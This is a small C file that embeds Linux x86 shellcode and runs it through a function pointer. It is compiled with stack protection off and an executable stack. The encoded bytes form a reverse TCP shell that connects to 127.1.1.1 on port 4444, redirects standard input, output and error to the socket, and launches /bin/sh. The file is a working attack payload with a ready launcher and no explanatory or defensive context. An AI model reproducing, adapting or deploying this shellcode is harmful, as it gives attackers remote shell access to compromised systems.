// compile with
// gcc -fno-stack-protector -z execstack _shellskeleton.c shellskeleton

#include<stdio.h>
#include<string.h>

unsigned char code [] = \
"\x31\xc0\x89\xc3\x89\xc1\x89\xc7\x89\xc6\xb0\x66\xfe\xc3\x51\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xb3\x03\x68\x7f\x01\x01\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x83\xf9\x03\x75\xf5\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{
    printf("Shellcode Lenth: %d\n", strlen(code));
    int (*ret)() = (int(*)())code;
    ret();
}